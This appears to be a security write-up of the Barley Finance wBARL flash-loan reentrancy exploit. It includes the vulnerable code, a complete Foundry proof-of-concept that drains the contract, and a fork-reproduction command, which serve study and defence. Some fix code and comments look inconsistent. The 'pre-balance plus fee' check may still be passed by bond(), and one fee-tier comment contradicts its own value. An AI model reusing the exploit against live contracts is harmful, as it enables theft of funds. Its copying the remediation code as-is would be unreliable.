# Barley Finance Security Incident Analysis
**Reentrancy Attack | Ethereum | 2024-01-28 | Loss: ~$130,000**

---

## 1. Incident Overview

| Field | Details |
|------|------|
| Project | Barley Finance (wBARL — Wrapped Barley Index) |
| Chain | Ethereum Mainnet |
| Date | 2024-01-28 (UTC) |
| Loss | ~$130,000 USD (>10% of total BARL token supply) |
| Vulnerability Type | Reentrancy Attack (Flash Loan-Based Reentrancy) |
| Attack Transaction | `0x995e880635f4a7462a420a58527023f946710167ea4c6c093d7d193062a33b01` ([Etherscan](https://etherscan.io/tx/0x995e880635f4a7462a420a58527023f946710167ea4c6c093d7d193062a33b01)) |
| Attacker Address | `0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6` ([Etherscan](https://etherscan.io/address/0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6)) |
| Attack Contract | `0x356e7481b957be0165d6751a49b4b7194aef18d5` ([Etherscan](https://etherscan.io/address/0x356e7481b957be0165d6751a49b4b7194aef18d5)) |
| Vulnerable Contract (wBARL) | `0x04c80bb477890f3021f03b068238836ee20aa0b8` ([Etherscan](https://etherscan.io/address/0x04c80bb477890f3021f03b068238836ee20aa0b8)) |
| Root Cause Summary | The `flash()` function in the wBARL contract invokes an external callback without any reentrancy guard, allowing `bond()` to be called within the callback to mint wBARL tokens without limit |
| Contract Deployment Date | 2024-01-26 (2 days before the incident) |
| PoC Source | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/BarleyFinance_exp.sol) |

---

## 2. Vulnerability Analysis

### 2.1 Flash Loan-Based Reentrancy

**Severity**: CRITICAL
**CWE**: CWE-841 (Improper Enforcement of Behavioral Workflow), CWE-362 (Race Condition)

#### Background: wBARL Contract Architecture

Barley Finance's `wBARL` (WeightedIndex) contract provides three core functions:

1. **`flash(address _recipient, address _token, uint256 _amount, bytes _data)`**: A built-in flash loan facility that lends out tokens held by the contract and collects a fee (in DAI) upon repayment.
2. **`bond(address _token, uint256 _amount)`**: Deposits a specified index constituent token and mints a proportional amount of wBARL tokens in return.
3. **`debond(uint256 _amount, address[], uint8[])`**: Burns wBARL tokens and withdraws the underlying assets proportionally.

#### Vulnerability Description

The `flash()` function operates in the following sequence:

1. Transfers the requested token to the recipient (`_recipient`)
2. Invokes the recipient's `callback()` function
3. Verifies repayment (including the DAI fee) **after** the callback returns

The issue is that **calls to `bond()` are not blocked during callback execution**. An attacker can immediately deposit the BARL tokens received via the flash loan into `bond()` within the callback, minting wBARL. During this process, `bond()` pulls BARL tokens into the contract, which the `flash()` function interprets as "repayment."

As a result, the attacker can:
- **Flash-loaned BARL** → deposit via `bond()` → **mint wBARL for free**
- Accumulate wBARL without any flash loan repayment obligation
- Burn accumulated wBARL via `debond()` → withdraw underlying BARL
- Repeat this process 20 times to fully drain the protocol

#### Vulnerable Code (❌)

```solidity
// wBARL (WeightedIndex) — flash() function (estimated vulnerable version)
function flash(
    address _recipient,
    address _token,
    uint256 _amount,
    bytes memory _data
) external {
    uint256 _fee = _amount * FLASH_FEE / 10000;

    // [❌ VULNERABILITY] Transfer token to recipient
    IERC20(_token).safeTransfer(_recipient, _amount);

    // [❌ VULNERABILITY] External callback invoked — reentrancy possible at this point
    // No mutex/guard blocks bond() from being called inside the callback
    IFlashReceiver(_recipient).callback(_data);

    // [❌ VULNERABILITY] Repayment check is performed after the callback
    // However, because bond() restored the contract balance,
    // this require passes — even though no actual repayment occurred
    require(
        IERC20(_token).balanceOf(address(this)) >= _amount + _fee,
        "FLASHREPAYNOTMET"
    );
    // [❌ VULNERABILITY] Only the DAI fee is checked; the token balance increase caused by
    // bond() causes the flash loan to be treated as "properly repaid"
    DAI.safeTransferFrom(_recipient, address(this), _fee);
}
```

#### Secure Code (✅)

```solidity
// Fix 1: Apply ReentrancyGuard + CEI pattern
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

bool private _flashActive; // Flag indicating an active flash loan

function flash(
    address _recipient,
    address _token,
    uint256 _amount,
    bytes memory _data
) external nonReentrant {
    require(!_flashActive, "REENTRANCY: flash already active");

    uint256 _balanceBefore = IERC20(_token).balanceOf(address(this));
    uint256 _fee = _amount * FLASH_FEE / 10000;

    // [✅ FIX] Set flash loan active flag (blocks bond/debond)
    _flashActive = true;

    IERC20(_token).safeTransfer(_recipient, _amount);

    // [✅ FIX] Invoke callback
    IFlashReceiver(_recipient).callback(_data);

    // [✅ FIX] Clear flag
    _flashActive = false;

    // [✅ FIX] Balance-based repayment validation (distinguishes bond-induced balance increase from genuine repayment)
    require(
        IERC20(_token).balanceOf(address(this)) >= _balanceBefore + _fee,
        "FLASHREPAYNOTMET"
    );
    DAI.safeTransferFrom(_recipient, address(this), _fee);
}

// [✅ FIX] Block bond/debond while flash loan is active
modifier noFlashActive() {
    require(!_flashActive, "OPERATION_BLOCKED_DURING_FLASH");
    _;
}

function bond(address _token, uint256 _amount) external override noSwap noFlashActive {
    // ... existing logic
}

function debond(uint256 _amount, address[] memory, uint8[] memory)
    external override noSwap noFlashActive {
    // ... existing logic
}
```

---

### 2.2 Flash Loan Balance Validation Bypass

**Severity**: CRITICAL
**CWE**: CWE-670 (Always-Incorrect Control Flow Implementation)

#### Description

The repayment validation logic in `flash()` checks only whether the contract's token balance has increased. Because a `bond()` call transfers tokens into the contract, the tokens sent out via the flash loan appear to have "come back" through `bond()`. This allows the validation to pass while the attacker mints wBARL for free.

---

### 2.3 Attack Shortly After Contract Deployment (Rushed Deployment)

**Severity**: HIGH
**CWE**: CWE-1188 (Insecure Default Initialization)

#### Description

The wBARL contract was deployed on 2024-01-26, and the attack occurred just two days later on 2024-01-28. Real funds had been deposited into the contract without a security audit. Two preparatory transactions (DAI transfers) were observed on-chain prior to the attack, indicating a premeditated exploit.

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                       Preparation Phase                             │
│                                                                     │
│  Attacker EOA (0x7b3a...)                                           │
│  ├─ Deploy attack contract (0x356e...)                              │
│  └─ Transfer 200 DAI (pre-fund for fee payments)                   │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│                    Attack Loop (20 Iterations)                      │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  STEP 1: Approve 10 DAI → wBARL contract                    │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                      │
│                              ▼                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  STEP 2: Call wBARL.flash()                                  │   │
│  │  - Recipient: attack contract                                │   │
│  │  - Token: BARL                                               │   │
│  │  - Amount: entire BARL balance held by wBARL                │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                      │
│                              ▼                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  STEP 3: wBARL → transfers BARL to attack contract          │   │
│  │  (flash loan execution)                                      │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                      │
│                              ▼                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  STEP 4: callback() invoked ← [❌ Reentrancy entry point]   │   │
│  │                                                              │   │
│  │  Inside callback():                                          │   │
│  │    ├─ BARL.approve(wBARL, full balance)                      │   │
│  │    └─ wBARL.bond(BARL, full balance)                         │   │
│  │         ├─ BARL tokens transferred into wBARL               │   │
│  │         │  (interpreted as flash loan "repayment")           │   │
│  │         └─ wBARL tokens minted → received by attack contract │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                      │
│                              ▼                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  STEP 5: flash() repayment validation passes                 │   │
│  │  - wBARL balance restored → require passes                   │   │
│  │  - Only the DAI fee (10 DAI) is actually paid                │   │
│  │  (attacker has minted wBARL for free)                        │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                      │
│                         Repeat ×20                                  │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│                        Profit Extraction Phase                      │
│                                                                     │
│  STEP 6: Call wBARL.debond()                                        │
│  - Burn all accumulated wBARL                                       │
│  - Withdraw all underlying BARL                                     │
│                                                                     │
│  STEP 7: Swap BARL → DAI → WETH (Uniswap V3)                       │
│  - ~7,880,000 BARL → 119,220.66 DAI                                │
│  - 119,220.66 DAI → 52.13 WETH (~$116,819)                         │
│                                                                     │
│  Final attacker profit: ~52.13 WETH ($116,819 USD)                 │
└─────────────────────────────────────────────────────────────────────┘
```

**Step-by-Step Description**:

1. **Preparation**: The attacker deploys the attack contract and transfers 200 DAI to it for use as flash loan fees. These two preparatory transactions indicate a premeditated attack.

2. **Loop Start (i=0–19)**: Each iteration approves 10 DAI to the wBARL contract, then calls `flash()` targeting the entire BARL balance held by wBARL.

3. **Flash Loan Execution**: The wBARL contract transfers all BARL to the attack contract.

4. **Reentrancy (Core)**: `flash()` invokes `callback()` on the attack contract. Inside the callback, the attack contract deposits all received BARL into `bond()` to mint wBARL. In doing so, BARL is transferred back into the wBARL contract, causing `flash()`'s repayment validation to pass.

5. **Free wBARL Minting**: By reinvesting the flash-loaned BARL into `bond()`, the attacker effectively mints wBARL at no cost. The amount minted increases with each round.

6. **Profit Extraction**: After 20 loop iterations, `debond()` burns all accumulated wBARL and withdraws the underlying BARL. The attacker then swaps BARL → DAI → WETH via Uniswap V3, ultimately netting ~52.13 WETH (~$116,819).

---

## 4. PoC Code Analysis

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// DeFiHackLabs PoC: BarleyFinance_exp.sol
// Attack date: 2024-01-28
// Total loss: ~$130K

contract ContractTest is Test {
    // Relevant token and contract addresses
    IERC20 private constant DAI  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant BARL = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    // [VULNERABLE CONTRACT] wBARL = WeightedIndex, provides flash/bond/debond
    IwBARL private constant wBARL = IwBARL(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);
    IUniswapV3Router private constant Router =
        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        // Fork just before the attack block (block 19,106,654)
        vm.createSelectFork("mainnet", 19_106_654);
    }

    function testExploit() public {
        // [PRECONDITION] Acquire 200 DAI (in the actual attack, pre-transferred beforehand)
        // Actual preparation txs:
        //   0xa685928b...  (DAI transfer 1)
        //   0xaaa197c7...  (DAI transfer 2)
        deal(address(DAI), address(this), 200e18);

        emit log_named_decimal_uint(
            "Attacker WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
        );

        uint8 i;
        // [CORE LOOP] 20 iterations to mint wBARL for free
        while (i < 20) {
            // Approve 10 DAI per iteration (flash loan fee)
            DAI.approve(address(wBARL), 10e18);

            // [❌ REENTRANCY ENTRY POINT]
            // Request all BARL held by wBARL as a flash loan
            // → wBARL transfers BARL, then calls callback()
            // → Inside callback(), bond() re-deposits BARL → mints wBARL
            // → flash() repayment check passes thanks to bond()
            wBARL.flash(
                address(this),          // recipient: this attack contract
                address(BARL),          // token: BARL
                BARL.balanceOf(address(wBARL)), // amount: full BARL balance of wBARL
                ""                      // data: not needed
            );
            ++i;
        }

        // [PROFIT EXTRACTION STEP 1] Burn all accumulated wBARL → withdraw BARL
        address[] memory token = new address[](1);
        token[0] = address(BARL);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100; // 100% debond

        wBARL.debond(wBARL.balanceOf(address(this)), token, percentage);

        // [PROFIT EXTRACTION STEP 2] Swap BARL → DAI → WETH (Uniswap V3)
        BARLToWETH();

        emit log_named_decimal_uint(
            "Attacker WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    // [REENTRANCY CALLBACK] Callback function invoked by flash()
    function callback(bytes calldata data) external {
        // Immediately bond() all received BARL — mint wBARL for free
        BARL.approve(address(wBARL), BARL.balanceOf(address(this)));
        wBARL.bond(address(BARL), BARL.balanceOf(address(this)));
        // bond() moves BARL into the wBARL contract →
        // flash() balance check passes, attacker receives wBARL tokens for free
    }

    // Uniswap V3: BARL → DAI → WETH multi-hop swap
    function BARLToWETH() internal {
        BARL.approve(address(Router), type(uint256).max);
        // Path: BARL --[0.3%]--> DAI --[0.05%]--> WETH
        bytes memory _path = abi.encodePacked(
            address(BARL),
            hex"002710",  // fee tier: 0.3% (10000 = 1%)
            address(DAI),
            hex"0001f4",  // fee tier: 0.05%
            address(WETH)
        );
        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
            path:             _path,
            recipient:        address(this),
            deadline:         block.timestamp + 1000,
            amountIn:         BARL.balanceOf(address(this)),
            amountOutMinimum: 0  // No slippage protection (favorable to attacker)
        });
        Router.exactInput(params);
    }
}
```

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Affected Component | Severity |
|--------|---------|-------------|--------|
| CWE-841 | Improper Enforcement of Behavioral Workflow (reentrancy allowed) | `wBARL.flash()` | CRITICAL |
| CWE-362 | Improper Synchronization of Shared Resource (Race Condition) | `flash()` ↔ `bond()` | CRITICAL |
| CWE-670 | Always-Incorrect Control Flow Implementation (balance validation bypass) | `flash()` repayment validation logic | CRITICAL |
| CWE-694 | Target-dependent TOCTOU (check-use timing) | `flash()` balance check timing | HIGH |
| CWE-1188 | Insecure Default Initialization (deployed without security controls) | WeightedIndex deployment | HIGH |
| CWE-400 | Uncontrolled Resource Consumption | Unlimited wBARL minting | HIGH |

### V-01: Flash Loan Reentrancy

- **Description**: The `flash()` function does not block calls to `bond()` while an external callback is executing. An attacker can call `bond()` within the callback to mint wBARL for free.
- **Impact**: Full theft of all BARL tokens held by the protocol, ~$130,000 loss
- **Attack Prerequisites**:
  - Ability to pay flash loan fees (DAI)
  - Deployment of an attack contract
  - `flash()` function architecture that permits reentrancy

### V-02: Flash Loan Repayment Validation Bypass

- **Description**: The repayment validation in `flash()` simply checks whether the contract's token balance has increased. When `bond()` restores the balance, the check passes even without an actual token return.
- **Impact**: Flash loan degrades into a "free loan" — paying only the fee with no principal repayment required
- **Attack Prerequisites**: Same as V-01 (reentrancy is a prerequisite)

### V-03: Premature Operation Without Audit

- **Description**: The contract was deployed and accepting real funds within just 2 days of deployment. No security audit appears to have been conducted, and even basic reentrancy patterns were not reviewed.
- **Impact**: Core vulnerability went undetected through testnet or audit processes
- **Attack Prerequisites**: N/A (operational failure)

---

## 6. Reproducibility Assessment

| Item | Assessment |
|------|------|
| Attack Complexity | Low — PoC consists of ~50 concise lines of code |
| Required Capital | Very low — only 200 DAI (~$200) needed for fees |
| Expertise Required | Low — straightforward application of a basic reentrancy pattern |
| Reproducibility | Very high — immediately reproducible via same-block fork |
| Attack Detectability | Low — single transaction, pattern resembles normal DeFi activity |

**Block Fork Reproduction Command (Foundry)**:
```bash
forge test --match-test testExploit -vv \
  --fork-url https://eth-mainnet.public.blastapi.io \
  --fork-block-number 19106654
```

---

## 7. Remediation

### Immediate Actions

#### Action 1: Apply ReentrancyGuard to the `flash()` Function

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract WeightedIndex is ReentrancyGuard, ... {
    function flash(
        address _recipient,
        address _token,
        uint256 _amount,
        bytes memory _data
    ) external nonReentrant {  // ← add nonReentrant
        uint256 _balanceBefore = IERC20(_token).balanceOf(address(this));
        uint256 _fee = _amount * FLASH_FEE / 10000;

        IERC20(_token).safeTransfer(_recipient, _amount);
        IFlashReceiver(_recipient).callback(_data);

        // Balance-based validation (blocks bypass via bond())
        require(
            IERC20(_token).balanceOf(address(this)) >= _balanceBefore + _fee,
            "FLASHREPAYNOTMET"
        );
        DAI.safeTransferFrom(_recipient, address(this), _fee);
    }
}
```

#### Action 2: Block `bond()`/`debond()` While `flash()` Is Active

```solidity
bool private _inFlash;  // State variable indicating an active flash loan

modifier noFlashActive() {
    require(!_inFlash, "BLOCKED: flash loan in progress");
    _;
}

function flash(...) external nonReentrant {
    _inFlash = true;
    // ... flash loan logic
    _inFlash = false;
}

// Add modifier to bond and debond
function bond(address _token, uint256 _amount)
    external override noSwap noFlashActive {
    // ... existing logic
}

function debond(uint256 _amount, address[] memory, uint8[] memory)
    external override noSwap noFlashActive {
    // ... existing logic
}
```

#### Action 3: Apply the Checks-Effects-Interactions (CEI) Pattern

```solidity
function flash(
    address _recipient,
    address _token,
    uint256 _amount,
    bytes memory _data
) external nonReentrant {
    // [CHECK] Input validation
    require(_amount > 0, "INVALID_AMOUNT");
    require(_isTokenInIndex[_token] || _token == address(this), "INVALID_TOKEN");

    uint256 _balanceBefore = IERC20(_token).balanceOf(address(this));
    uint256 _fee = _amount * FLASH_FEE / 10000;

    // [EFFECT] Protect with flag when no state update is possible
    _inFlash = true;

    // [INTERACTION] External calls last
    IERC20(_token).safeTransfer(_recipient, _amount);
    IFlashReceiver(_recipient).callback(_data);

    // [CHECK] Repayment validation
    uint256 _balanceAfter = IERC20(_token).balanceOf(address(this));
    require(
        _balanceAfter >= _balanceBefore + _fee,
        "FLASHLOAN_NOT_REPAID"
    );
    DAI.safeTransferFrom(_recipient, address(this), _fee);

    _inFlash = false;
}
```

### Long-Term Improvements

| Vulnerability | Recommended Action | Priority |
|--------|-----------|---------|
| Flash Loan Reentrancy | Apply OpenZeppelin `ReentrancyGuard` throughout | Critical |
| Bond/Debond State Isolation | Use `_inFlash` flag to block manipulation during flash loans | Critical |
| Balance Validation Hardening | Compare against "pre-balance + fee" rather than a simple balance check | Critical |
| Audit Process | Conduct at least 2 independent security audits before mainnet deployment | High |
| Staging Environment | Operate on testnet for a sufficient period before mainnet deployment | High |
| Bug Bounty Program | Provide white-hat hacker incentives via Immunefi or similar platforms | Medium |
| On-Chain Monitoring | Detect anomalous patterns using Tenderly or OpenZeppelin Defender | Medium |
| Emergency Pause Mechanism | Apply `Pausable` pattern to enable immediate shutdown in the event of an incident | High |
| Flash Loan Whitelist | Restrict flash loan recipients to authorized addresses only | Low |

---

## 8. Lessons Learned

### 8.1 Technical Lessons

1. **Flash loans and state-mutating functions must always be isolated**
   - A flash loan callback is equivalent to executing arbitrary code. During callback execution, core state-mutating functions (mint, burn, swap, etc.) must be explicitly blocked from running.

2. **The CEI pattern is a necessary condition for reentrancy safety, not a sufficient one**
   - Even when following the Checks-Effects-Interactions pattern, balance validations can be bypassed by external calls, as demonstrated by this attack. The `nonReentrant` modifier must be used in conjunction.

3. **Balance-based validation must account for context**
   - A simple `balanceOf(address(this)) >= amount` check can be defeated by functions like `bond()` that artificially inflate the balance. Validation logic must verify "genuine repayment via an independent code path."

4. **Interaction testing between composite functions (flash + bond + debond) is mandatory**
   - Testing each function in isolation is insufficient. Security tests must include scenarios where other functions are called from within a flash loan callback.

### 8.2 Operational Lessons

5. **Going live immediately after deployment is the highest-risk scenario**
   - The attack occurred just 2 days after deployment. Attracting large amounts of capital without a sufficient observation period after deployment is extremely dangerous. Rate-limiting withdrawals or phased capital onboarding is strongly recommended during the early post-deployment period.

6. **Signs of premeditated attacks must be detected**
   - Two small DAI transfer transactions were observed on-chain before the actual attack. This type of "preparation transaction" pattern can be detected through on-chain monitoring.

7. **Internal testing alone is insufficient**
   - The fact that basic reentrancy patterns were not applied to the deployed contract demonstrates the limits of internal security review alone. Independent external audits are essential.

### 8.3 Comparison with Similar Incidents

| Incident | Date | Vulnerability | Loss | Similarity |
|------|------|--------|------|--------|
| Cream Finance | 2021-10-27 | Flash Loan Reentrancy | $130M | Collateral manipulation from flash loan callback |
| Arcadia Finance | 2023-07-10 | Cross-function Reentrancy | $455K | Reentrancy permitted between internal functions |
| NBLGAME | 2024-01-25 | Reentrancy | Unknown | Same vulnerability, occurred 3 days prior |
| EarningFarm | 2023-08-09 | Reentrancy | $287K | Single-transaction reentrancy |

### 8.4 On-Chain Verification Summary

| Item | Value |
|------|--------|
| Attack Transaction Block | #19,106,655 |
| Attacker EOA | `0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6` |
| Attack Contract | `0x356e7481b957be0165d6751a49b4b7194aef18d5` |
| Vulnerable Contract (wBARL) | `0x04c80bb477890f3021f03b068238836ee20aa0b8` |
| Final Swap: BARL → DAI | ~7,880,000 BARL → 119,220.66 DAI ($119,125) |
| Final Swap: DAI → WETH | 119,220.66 DAI → 52.13 WETH ($116,819) |
| Gas Used | 2,205,636 / 2,759,977 (79.92%) |
| Transaction Fee | 0.0309 ETH ($69.24) |
| Attacker Funding Source | `0x077D360f...c9be7C4A4` (1.7444977 ETH) |
| Contract Deployment Date | 2024-01-26 |
| Attack Date | 2024-01-28 |
| Preparatory Transactions | `0xa685928b...`, `0xaaa197c7...` (DAI transfers) |

---

## References

- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/BarleyFinance_exp.sol)
- [Neptune Mutual Analysis (Medium)](https://medium.com/neptune-mutual/analysis-of-the-barley-finance-exploit-d2df61b98c80)
- [Phalcon Twitter Alert](https://twitter.com/Phalcon_xyz/status/1751788389139992824)
- [Attack Transaction (Etherscan)](https://etherscan.io/tx/0x995e880635f4a7462a420a58527023f946710167ea4c6c093d7d193062a33b01)
- [Vulnerable Contract Source (Etherscan)](https://etherscan.io/address/0x04c80bb477890f3021f03b068238836ee20aa0b8#code)
- [Attacker Address (Etherscan)](https://etherscan.io/address/0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6)
- [CWE-841: Improper Enforcement of Behavioral Workflow](https://cwe.mitre.org/data/definitions/841.html)
- [CWE-362: Race Condition](https://cwe.mitre.org/data/definitions/362.html)